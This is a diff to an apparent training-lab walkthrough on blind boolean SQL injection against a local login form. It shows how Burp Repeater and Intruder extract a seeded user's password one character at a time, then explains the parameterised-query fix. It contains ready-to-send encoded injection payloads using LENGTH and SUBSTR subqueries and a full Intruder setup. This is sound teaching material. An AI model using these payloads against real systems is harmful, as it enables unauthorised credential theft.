@@ -30,9 +30,13 @@ It's the same class of bug as [`sqli-union-basic`](../sqli-union-basic/) — two
 
 So the attacker has the same injection capability but a much narrower exfil channel: a single bit per request. The rest of this walkthrough is about how that one bit, used carefully, still extracts the password.
 
-## 3. Exploitation via Burp Suite (primary track)
+## 3. Exploitation via Burp Suite
 
-Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8006/>, sign in with `alice / wonderland` once to capture the traffic, then right-click the `POST /login` request in **Proxy → HTTP history** and choose **Send to Repeater**.
+This atom is worked entirely in Burp Suite (Proxy → Repeater → Intruder). The web interface exists only as a legitimate destination for the requests — every step below happens in Burp.
+
+The login form on `/` issues a `POST /login` whose body is form-encoded as `username=<...>&password=<...>`. Build that request in a new Repeater tab targeting `127.0.0.1:8006` and send it once with the seeded credentials (`username=alice&password=wonderland`): the response body comes back with `<h1>Welcome, alice!</h1>`, your baseline for the success state. Every step below edits the body and re-sends.
+
+> **Notation convention.** A lone uppercase letter in a payload (`N`, `P`, `C`) is a *reading placeholder* — substitute a concrete value before sending the request. Sending the literal letter triggers an HTTP 500 (SQLite tries to resolve it as a column name).
 
 ### A note on encoding the body
 
@@ -152,19 +156,26 @@ Any boolean condition you can express in SQL can now be answered by sending one 
 
 ### Step 4 — Extract password length
 
-Switch from demonstrating the oracle to *using* it. Embed a subquery that asks something concrete about real data:
+Switch from demonstrating the oracle to *using* it. Embed a subquery that asks something concrete about real data — here, whether alice's password length equals some number N. Start with one concrete request that tests whether the length is 5:
 
-Body (decoded, N variable):
+Body (decoded):
 
 ```
-username=nobody' OR (SELECT LENGTH(password) FROM users WHERE username='alice') = N --&password=x
+username=nobody' OR (SELECT LENGTH(password) FROM users WHERE username='alice') = 5 --&password=x
 ```
 
-For each value of N you try, the subquery returns alice's actual password length, the comparison is true only when N matches, and the oracle flips accordingly. Run it manually a few times in Repeater:
+Body (Burp-ready):
 
-- `N = 5` → `Invalid credentials.`
-- `N = 10` → `Welcome, alice!`
-- `N = 15` → `Invalid credentials.`
+```
+username=nobody%27%20OR%20(SELECT%20LENGTH(password)%20FROM%20users%20WHERE%20username%3D%27alice%27)%20%3D%205%20--&password=x
+```
+
+Send. Response: `Invalid credentials.` — the length is not 5.
+
+Now iterate the number in place (in Repeater, edit just the `5`):
+
+- `... = 10 ...` → `Welcome, alice!`
+- `... = 15 ...` → `Invalid credentials.`
 
 Conclusion: alice's password is 10 characters long. You learned a fact about data you cannot read directly, by reading one bit per request.
 
@@ -172,56 +183,73 @@ A real attacker would automate this with Intruder (one position, payload set `Nu
 
 ### Step 5 — Extract characters and automate with Burp Intruder
 
-Same trick, finer-grained question. Instead of asking "is the length N?", ask "is the character at position P equal to C?".
+Same trick, a finer-grained question. Instead of asking "is the length N?", ask "is the character at position P equal to candidate C?". `SUBSTR(password, P, 1)` pulls one character out of the password, and the comparison turns it into the single bit the oracle reveals.
 
-Body (decoded, P = position, C = candidate character):
+**A — Probe the first character in Repeater**
+
+Before automating, validate the technique by hand. Concrete payload testing whether the first character is `a`:
+
+Body (decoded):
 
 ```
-username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),P,1) = 'C' --&password=x
+username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'a' --&password=x
 ```
 
-Demonstrate the first character by hand in Repeater. Substitute P=1 and try a candidate:
+Body (Burp-ready):
 
-- P=1, C=`a` → `Invalid credentials.`
-- P=1, C=`w` → `Welcome, alice!` → the first character is `w`.
+```
+username=nobody%27%20OR%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27alice%27),1,1)%20%3D%20%27a%27%20--&password=x
+```
 
-Doing this by hand for all 10 positions × 26 letters would be 260 requests. That's what Intruder is for.
+Send. Response: `Invalid credentials.` — the first character is not `a`.
 
-**Configure Intruder** (steps below use Burp Community menu names; Pro is identical):
+Change `'a'` to `'w'`, same request, send again. Response: `<h1>Welcome, alice!</h1>` — the first character is `w`.
 
-1. **Send to Intruder.** Right-click the working Repeater request and choose **Send to Intruder**. Switch to the Intruder tab.
-2. **Mark two payload positions** in the request body with `§...§`:
-   - The `1` inside `,1,` (the position P).
-   - The `'w'` you just used (the candidate C). Mark just the letter, not the surrounding single quotes.
+The two numeric arguments of `SUBSTR` play distinct roles, and the distinction matters for the next step. The first (`1`) is the *position* — which character to read, the one you vary to sweep the whole password. The second (`1`) is the *length* — how many characters to read, always 1, one char at a time.
 
-   Your body should look like:
+**B — Automate with Burp Intruder**
+
+Doing this by hand for all 10 positions × 26 letters would be 260 requests. That's what Intruder is for. (Menu names below are Burp Community Edition; Pro is identical.)
+
+1. **Send to Intruder.** Right-click the working Repeater request, choose **Send to Intruder**, and switch to the Intruder tab. The base request in the **Positions** editor, before you mark anything, is:
+
+   ```
+   username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'w' --&password=x
+   ```
+
+2. **Mark two payload positions** with `§...§`:
+   - The **first `1`** — the position argument of `SUBSTR`, sitting between `'alice'),` and `,1)`. This one sweeps `1` → `10`.
+   - The **`w`** between the single quotes — the candidate character. This one sweeps `a` → `z`. Mark just the letter, not the quotes.
+
+   The result in the editor:
 
    ```
    username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§' --&password=x
    ```
 
-3. **Attack type:** `Cluster bomb`. This iterates the Cartesian product of the two payload sets — every position combined with every candidate.
-4. **Payload set 1 (the `§1§` position):** type `Numbers`, from `1` to `10`, step `1`.
-5. **Payload set 2 (the `§w§` candidate):** type `Brute forcer`, character set `abcdefghijklmnopqrstuvwxyz`, length `1`. (The seed uses lowercase letters only — a real attacker would typically widen to `[a-zA-Z0-9]` or printable ASCII and accept more requests.)
-6. **Grep — Match.** Under the Intruder tab's **Settings** (or **Options** on older Burp versions), find the **Grep — Match** section and add the literal string `Welcome, alice!`. After the attack runs, Intruder will show a checkbox column for each request — exactly the binary oracle, surfaced as a sortable column.
-7. **Start attack.** With 10 positions × 26 letters = 260 requests, the attack completes in seconds against a local app.
+   **Do not mark the second `1`** — the length argument of `SUBSTR`, which stays fixed at 1. Both arguments are a literal `1` in the base payload, so it's easy to grab the wrong one. Mark the length instead of the position and the read stays pinned to position 1: the sweep then asks whether the *first N characters* equal a single candidate letter — only the `N = 1` case can be true, so you'd surface the first letter and never advance past it.
 
-Sort the results by the `Welcome, alice!` column. You get 10 matches, one per position. Read them off in order of position:
+3. **Attack type:** `Cluster bomb` — it iterates the Cartesian product of the two payload sets, every position combined with every candidate.
 
-```
-1: w
-2: o
-3: n
-4: d
-5: e
-6: r
-7: l
-8: a
-9: n
-10: d
-```
+4. **Payload set 1 (the position):**
+   - Type: `Numbers`
+   - From `1`, To `10`, Step `1`
+   - Payload count: 10
 
-Concatenated: `wonderland`. That's alice's stored password, recovered without it ever appearing in a single response body.
+5. **Payload set 2 (the candidate):**
+   - Type: `Simple list`
+   - Paste the 26 lowercase letters, one per line (`a`, `b`, `c`, ..., `z`)
+   - Payload count: 26
+
+   **Don't reach for `Brute forcer`** even though it looks like the obvious fit. Brute forcer with the charset `[a-z]` and a max length above 1 — the default in most Burp versions — generates 26⁴ = 456,976 payloads instead of 26. `Simple list` is deterministic: it generates exactly what's in the list.
+
+   Confirm before running — **Request count: 260** (10 × 26).
+
+6. **Grep — Match.** Under the Intruder tab's **Settings** (or **Options** on older Burp versions), find **Grep — Match** and add the literal string `Welcome, alice!`. Once the attack runs, Intruder shows a checkbox column per request — the binary oracle, surfaced as a sortable column.
+
+7. **Start attack.** Sort the results table by the `Welcome, alice!` column, descending. The 10 hits reveal, in position order, the letters `w`, `o`, `n`, `d`, `e`, `r`, `l`, `a`, `n`, `d` → `wonderland`.
+
+That's alice's stored password, recovered without it ever appearing in a single response body.
 
 ### Why this is "blind" — explicit contrast with sqli-union-basic
 
@@ -233,19 +261,7 @@ Here there is no data channel. The body has exactly two shapes: `Welcome` or `In
 
 A real-world note while we're here: real apps store passwords as hashes, not plaintext. The blind technique above works the same way against a hash column — you'd just be extracting `$2b$12$...` instead of `wonderland`, which takes many more requests (a wider charset and a longer string). The technique is what generalizes; the column you're reading is a detail of this particular lab.
 
-## 4. Exploitation via browser (secondary track, optional)
-
-Steps 1, 2, and 3 are practical to run from the browser if you don't have Burp configured yet — open <http://127.0.0.1:8006/>, paste each payload's *decoded* form into the username field, type anything for password, submit, read the resulting page:
-
-1. `alice' --` → `Welcome, alice!`
-2. `nobody' OR '1'='1` (broken) → `Invalid credentials.`; then `nobody' OR '1'='1' --` (corrected) → `Welcome, alice!`
-3. `nobody' OR 1=2 --` → `Invalid credentials.`
-
-Use this track for the first read-through to *feel* the oracle flipping between the two states with your own clicks.
-
-From Step 4 onward, the browser stops being practical. Step 4 needs you to iterate a number against the same payload, and Step 5 needs hundreds of requests fanned out across two payload positions — that's Repeater and Intruder work. Move to Burp once the oracle has clicked.
-
-## 5. Why the fix works
+## 4. Why the fix works
 
 See [`DIFF.md`](./DIFF.md) for the change. In short: the fixed version calls `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. With placeholders, the SQLite driver parses the SQL statement first — without the parameter values — and only afterward binds each input as a literal data value into the pre-parsed statement. No character in either input can shift the parse: `'`, `--`, `OR`, `SELECT`, parentheses, newlines all stay inside their respective string-literal slots and are never reinterpreted as SQL syntax.
 
